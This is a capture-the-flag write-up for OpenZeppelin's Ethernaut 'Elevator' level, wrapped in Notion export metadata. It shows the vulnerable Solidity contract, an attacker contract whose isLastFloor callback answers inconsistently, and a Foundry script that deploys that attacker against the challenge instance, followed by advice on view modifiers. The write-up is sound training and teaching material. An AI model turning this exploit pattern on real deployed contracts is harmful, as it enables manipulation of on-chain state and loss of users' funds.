---
title: "Elevator"
date: "2024-02-05"
lastmod: "2024-02-12T17:56:00.000Z"
draft: false
difficulty: "⭐⭐"
prev: "Re-entrancy-6ea65e4888e349dabdc4ca12c8e6d22d"
weight: 11
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/11"
next: "Privacy-0141c59931824d74a8311099eb338d5d"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "59c41c69-4afa-45c6-8e60-3000da840a2e"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-12T17:56:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "2fa50c76-9c63-4f19-b03a-b8fb1889da7c"
        name: "⭐⭐"
        color: "blue"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Re-entrancy-6ea65e4888e349dabdc4ca12c8e6d22d"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Re-entrancy-6ea65e4888e349dabdc4ca12c8e6d22d"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-05"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 11
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/11"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Privacy-0141c59931824d74a8311099eb338d5d"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Privacy-0141c59931824d74a8311099eb338d5d"
          href: null
    type:
      id: "s%7DKc"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "docs"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "docs"
          href: null
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Elevator"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Elevator"
          href: null
  url: "https://www.notion.so/Elevator-59c41c694afa45c68e603000da840a2e"
  public_url: null
UPDATE_TIME: "2024-02-13T10:43:55.279Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


---


title: Elevator
weight: 4
type: docs
next: re-entrancy
prev: privacy


[Level11](https://ethernaut.openzeppelin.com/level/11) - ⭐⭐


---


This elevator won't let you reach the top of your building. Right?


### Things that might help:

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Elevator {
  function top() external view returns(bool); 
  function floor() external view returns(uint); 
  function goTo(uint _floor) external; 
}

contract Building {
  Elevator public elevator;
  bool lastFloor;

  function installElevator(address _elevator) public {
    elevator = Elevator(_elevator);  
  }

  function isLastFloor(uint) public returns (bool) {
    if (lastFloor == false) {
      lastFloor = true;
      return false;
    }
    return true;
  }

  function attack(uint _floor) public {
    elevator.goTo(_floor); 
  }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Building} from "../src/11.sol";

interface Elevator {
  function top() external view returns(bool); 
  function floor() external view returns(uint); 
  function goTo(uint _floor) external; 
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_11");

        vm.startBroadcast(deployerPrivateKey);

        console.logUint(address(addr).balance);

        Elevator elevator = Elevator(addr);

        Building building = new Building();
        building.installElevator(addr);

        console.logBool(elevator.top());
        console.logUint(elevator.floor());

        building.attack(0);

        console.logBool(elevator.top());
        console.logUint(elevator.floor());

        vm.stopBroadcast();

    }
}
```


You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state.
Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.


An alternative way to solve this level is to build a view function 
which returns different results depends on input data but don't modify 
state, e.g. `gasleft()`.

